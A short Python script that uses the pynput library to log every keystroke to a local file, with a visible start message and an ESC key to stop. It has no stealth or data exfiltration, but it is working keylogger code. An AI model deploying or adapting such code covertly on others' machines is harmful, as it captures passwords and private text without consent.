from pynput import keyboard
from datetime import datetime


LOG_FILE = "keystrokes.log"


def on_press(key):
    try:
        key_name = key.char
    except AttributeError:
        key_name = f"[{key}]"

    with open(LOG_FILE, "a") as f:
        f.write(key_name)
        f.flush()

    if key == keyboard.Key.esc:
        return False


def main():
    print("Keystroke logger started. Press ESC to stop.")
    with open(LOG_FILE, "a") as f:
        f.write(f"\n--- Session started {datetime.now()} ---\n")

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

    print("Logging stopped. File saved.")


if __name__ == "__main__":
    main()
